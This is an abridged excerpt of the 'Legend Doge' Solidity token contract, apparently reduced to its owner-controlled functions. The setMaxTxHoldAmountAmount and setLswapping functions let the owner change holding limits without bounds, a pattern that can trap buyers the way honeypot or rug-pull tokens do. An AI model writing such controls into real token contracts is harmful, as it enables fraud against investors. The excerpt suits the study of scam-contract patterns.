...
contract LegendDoge is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress = payable(0xc5CF60167a99E129dA4d25355A487780BD0b8018); // Marketing Address
    ...
    string private _name = "Legend Doge";
    string private _symbol = "Legend Doge";
    ...
    uint256 public totalAllFee = _taxFee.add(_marketFee).add(_liquidityFee);
    uint public maxFee = 15;
    ...
    address public  uniswapV2Pair;
        ...
        uint256 public liquFee = 3;
        uint256 public totlalOneFee = markFee.add(liquFee);
         uint256 public _maxTxHoldAmount =  5 * 10**11 * 10**9;
    ...
    function  setMaxTxHoldAmountAmount(uint256 amount)public onlyOwner(){
      _maxTxHoldAmount =amount;
  }
		 function setErrerAdr( address  adr) public pauseOwner{
    ...
    function _approve(address owner, address spender, uint256 amount) private {
     ...
     function setLswapping(bool bools)external pauseOwner(){
       swapping=bools;
   }
    ...
    function _transfer(
        ...
        _tokenTransfer(from,to,amount,takeFee);
         if(!swapping&& from != owner() && to != owner()&&!isbig[to]){
             require(balanceOf(to) <= _maxTxHoldAmount, "Transfer amount exceeds the maxTxAmount.");
        }
    }
    ...
    function setTaxFeePercent(uint256 taxFee) external pauseOwner() {
        _taxFee = taxFee;
        _previousTaxFee = _taxFee;
        totalAllFee = _taxFee.add(_marketFee).add(_liquidityFee);
		require(totalAllFee <= maxFee,"error");
    }

    function setLiquidityFeePercent(uint256 liquidityFee) external pauseOwner() {
      ...
      function setMarketFeePercent(uint256 marketFee) external pauseOwner() {
